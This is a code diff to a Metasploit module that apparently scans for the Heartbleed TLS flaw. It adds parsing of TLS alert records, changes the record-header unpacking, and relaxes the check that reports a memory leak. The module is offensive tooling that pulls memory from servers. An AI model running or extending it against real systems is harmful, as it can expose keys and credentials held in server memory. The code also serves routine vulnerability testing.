@@ -67,6 +67,7 @@ class Metasploit3 < Msf::Auxiliary
 
   HANDSHAKE_RECORD_TYPE = 0x16
   HEARTBEAT_RECORD_TYPE = 0x18
+  ALERT_RECORD_TYPE     = 0x15
   TLS_VERSION = {
     '1.0' => 0x0301,
     '1.1' => 0x0302,
@@ -211,10 +212,27 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    unpacked = hdr.unpack('CnC')
+    unpacked = hdr.unpack('Cnn')
     type = unpacked[0]
     version = unpacked[1] # must match the type from client_hello
     len = unpacked[2]
+
+    # try to get the TLS error
+    if type == ALERT_RECORD_TYPE
+      res = sock.get_once(len)
+      alert_unp = res.unpack('CC')
+      alert_level = alert_unp[0]
+      alert_desc = alert_unp[1]
+      msg = "Unknown error"
+      # http://tools.ietf.org/html/rfc5246#section-7.2
+      case alert_desc
+        when 0x46
+          msg = "Protocol error. Looks like the chosen protocol is not supported."
+      end
+      print_error("#{peer} - #{msg}")
+      disconnect
+      return
+    end
 
     unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[datastore['TLSVERSION']]
       vprint_error("#{peer} - Unexpected Heartbeat response")
@@ -224,7 +242,7 @@ class Metasploit3 < Msf::Auxiliary
 
     vprint_status("#{peer} - Heartbeat response, checking if there is data leaked...")
     heartbeat_data = sock.get_once(heartbeat_length) # Read the magic length...
-    if heartbeat_data && heartbeat_data.length > len
+    if heartbeat_data
       print_good("#{peer} - Heartbeat response with leak")
       report_vuln({
         :host => rhost,
